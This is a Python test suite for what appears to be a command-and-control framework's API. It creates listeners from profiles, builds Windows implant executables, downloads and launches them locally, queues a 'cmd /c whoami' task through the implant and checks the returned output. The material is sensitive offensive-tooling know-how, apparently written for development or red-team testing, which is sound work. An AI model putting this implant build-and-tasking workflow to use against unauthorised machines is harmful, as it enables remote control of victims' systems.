"""
A test suite

Steps:
1. Connect to server
2. Create listeners (one for each profile in ./profiles)
3. Create payloads for each listener
4. Download each payload
5. Execute each payload (windows)
6. enqueue comamnd for payload (cmd whoami)
7. check after X seconds if outputis correct (ex, "abcd")
"""

import base64
import glob
import os
import subprocess
import time
import uuid

import requests

# --- Configuration ---
API_HOST = "http://10.0.0.30:45045"
API_BASE = f"{API_HOST}/api/v1"
PROFILES_DIR = "./profiles"
DOWNLOAD_DIR = "./downloads"
SLEEP_INTERVAL = 5  # Seconds to wait between polls
MAX_RETRIES = 12  # Max number of polls (12 * 5s = 60s total wait)

# Ensure directories exist
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(PROFILES_DIR, exist_ok=True)


def log(msg, level="INFO"):
    print(f"[{level}] {msg}")


def step_1_connect():
    """Step 1: Connect to server (Health Check)"""
    try:
        # Hitting the listeners endpoint to verify connectivity
        resp = requests.get(f"{API_BASE}/listeners/")
        if resp.status_code == 200:
            log("Successfully connected to server.", "SUCCESS")
            return True
        else:
            log(f"Connected, but received status {resp.status_code}", "WARNING")
            return True
    except requests.exceptions.ConnectionError:
        log("Failed to connect to server.", "ERROR")
        return False


def step_2_create_listener(profile_name, profile_data):
    """Step 2: Create a listener"""
    # Generating a unique name to avoid collision on repeated runs
    unique_name = f"list_{profile_name}_{uuid.uuid4().hex[:4]}"

    # Payload based on 'ListenerSpawnModel' in your Swagger spec
    payload = {
        "listener_name": unique_name,
        "listener_type": "http",  # Assumed type
        "listener_host": "127.0.0.1",
        "listener_port": 8080,  # Ensure this port is free
        "listener_notes": "Automated test listener",
        "listener_profile": profile_data,
    }

    resp = requests.post(f"{API_BASE}/listeners/", json=payload)

    if resp.status_code == 200:
        # Assuming the API returns the UUID directly or in a dict
        # Adjust 'get("id")' based on exact server response (spec just says "Returns ID")
        try:
            data = resp.json()
            listener_id = (
                data if isinstance(data, str) else data.get("uuid", data.get("id"))
            )
            log(f"Listener created. ID: {listener_id}", "SUCCESS")
            return listener_id
        except:
            log(f"Listener created but could not parse ID. Resp: {resp.text}", "ERROR")
            return None
    else:
        log(f"Failed to create listener: {resp.text}", "ERROR")
        return None


def step_3_build_payload(listener_uuid):
    """Step 3: Create payload"""
    # Payload based on 'BuildImplantInput' in Swagger spec
    payload = {
        "implant_name": f"build_{uuid.uuid4().hex[:4]}",
        "implant_listener_uuid": listener_uuid,
        "implant_variant": "http_wininet",
        "output_format": "exe",
    }

    # Note: Swagger spec defines 'uuid' in path for POST /build/,
    # but also a body. We send the request to /build/ with the body.
    resp = requests.post(f"{API_BASE}/build/", json=payload)

    if resp.status_code == 200:
        try:
            data = resp.json()
            # Spec says "Returns ID/Hash"
            build_hash = (
                data if isinstance(data, str) else data.get("hash", data.get("uuid"))
            )
            log(f"Payload build task submitted. Hash: {build_hash}", "SUCCESS")
            return build_hash
        except:
            log(f"Failed to parse build response: {resp.text}", "ERROR")
            return None
    else:
        log(f"Failed to build payload: {resp.text}", "ERROR")
        return None


def step_4_download_payload(build_hash):
    """Step 4: Download payload"""
    # Give the server a second to compile if needed
    time.sleep(2)

    url = f"{API_BASE}/build/{build_hash}"
    resp = requests.get(url)

    if resp.status_code == 200:
        filename = os.path.join(DOWNLOAD_DIR, f"implant_{build_hash}.exe")
        with open(filename, "wb") as f:
            f.write(resp.content)
        log(f"Payload downloaded to: {filename}", "SUCCESS")
        return filename
    else:
        log(f"Failed to download payload. Status: {resp.status_code}", "ERROR")
        return None


def step_5_execute_payload(filepath):
    """Step 5: Execute payload (Windows)"""
    try:
        # Using subprocess.Popen to run it without blocking the script
        proc = subprocess.Popen([filepath], creationflags=subprocess.CREATE_NEW_CONSOLE)
        log(f"Executed payload. PID: {proc.pid}", "SUCCESS")
        return proc
    except Exception as e:
        log(f"Execution failed: {e}", "ERROR")
        return None


def wait_for_implant_checkin(listener_uuid):
    """Helper: Poll /implants/ until a relevant implant appears"""
    log("Waiting for implant check-in...", "INFO")

    for _ in range(MAX_RETRIES):
        resp = requests.get(f"{API_BASE}/implants/")
        if resp.status_code == 200:
            implants = resp.json()
            # Swagger says it returns a list of implants.
            # We look for one that matches our listener (if that metadata exists)
            # or just the most recent one.
            if isinstance(implants, list) and len(implants) > 0:
                # Naive approach: grab the last one
                # Ideally, we match 'listener' field if available in response
                implant = implants[-1]
                implant_uuid = implant.get("uuid", implant.get("id"))
                log(f"Implant checked in! UUID: {implant_uuid}", "SUCCESS")
                return implant_uuid

        time.sleep(SLEEP_INTERVAL)

    log("Timed out waiting for implant.", "ERROR")
    return None


def step_6_queue_command(implant_uuid):
    """Step 6: Enqueue command (whoami)"""
    # Matches 'Task' definition in Swagger
    command_str = "cmd /c whoami"
    task_data = {
        "implant_uuid": implant_uuid,
        "task": {
            "taskname": "cmd",  # Assuming 'cmd' is the verb
            "args": {"cli": command_str},
        },
    }

    resp = requests.post(f"{API_BASE}/implants/{implant_uuid}/task", json=task_data)
    if resp.status_code == 200:
        log(f"Command '{command_str}' queued.", "SUCCESS")
        return command_str
    else:
        log(f"Failed to queue command: {resp.text}", "ERROR")
        return None


def step_7_check_output(implant_uuid, expected_substring):
    """Step 7: Check history for output"""
    log(f"Polling history for output containing: '{expected_substring}'", "INFO")

    for i in range(MAX_RETRIES):
        resp = requests.get(f"{API_BASE}/implants/{implant_uuid}/tasks/history")
        if resp.status_code == 200:
            history_data = resp.json()
            # Spec example: {"data": [...]}
            tasks = (
                history_data.get("data", [])
                if isinstance(history_data, dict)
                else history_data
            )

            for task in tasks:
                # Spec: "task_response": null (until filled)
                response = task.get("task_response")
                if response:
                    # Check raw string
                    if expected_substring.lower() in str(response).lower():
                        log(f"Verified output: found '{expected_substring}'", "SUCCESS")
                        return True

                    # Check base64 decoded
                    try:
                        decoded = base64.b64decode(response).decode(
                            "utf-8", errors="ignore"
                        )
                        if expected_substring.lower() in decoded.lower():
                            log(
                                f"Verified output (decoded): found '{expected_substring}'",
                                "SUCCESS",
                            )
                            return True
                    except:
                        pass

        time.sleep(SLEEP_INTERVAL)
        print(f"   ...waiting for task response ({i+1}/{MAX_RETRIES})")

    log("Failed to verify output within timeout.", "ERROR")
    return False


def main():
    log("--- Starting Test Suite ---")

    # 1. Connect
    if not step_1_connect():
        return

    # Get profiles
    profiles = glob.glob(os.path.join(PROFILES_DIR, "*"))
    if not profiles:
        log("No profiles found. Creating dummy profile.", "WARNING")
        with open(os.path.join(PROFILES_DIR, "default_test.prof"), "w") as f:
            f.write("default_profile_content")
        profiles = glob.glob(os.path.join(PROFILES_DIR, "*"))

    for profile_path in profiles:
        profile_name = os.path.basename(profile_path)
        with open(profile_path, "r") as f:
            profile_content = f.read()

        log(f"\n--- Testing Profile: {profile_name} ---")

        # 2. Create Listener
        listener_id = step_2_create_listener(profile_name, profile_content)
        if not listener_id:
            continue

        # 3. Build Payload
        build_hash = step_3_build_payload(listener_id)
        if not build_hash:
            continue

        # 4. Download Payload
        exe_path = step_4_download_payload(build_hash)
        if not exe_path:
            continue

        # 5. Execute Payload
        process = step_5_execute_payload(exe_path)
        if not process:
            continue

        # Wait for Check-in
        implant_uuid = wait_for_implant_checkin(listener_id)

        if implant_uuid:
            # 6. Queue Command
            if step_6_queue_command(implant_uuid):
                # 7. Check Output
                # We expect the current computer user (e.g. desktop\user)
                current_user = os.getlogin()
                step_7_check_output(implant_uuid, current_user)

            # Cleanup: Delete implant from DB
            requests.delete(f"{API_BASE}/implants/{implant_uuid}")

        # Cleanup: Kill the local process
        process.kill()
        log(f"--- Completed Profile: {profile_name} ---")


if __name__ == "__main__":
    main()
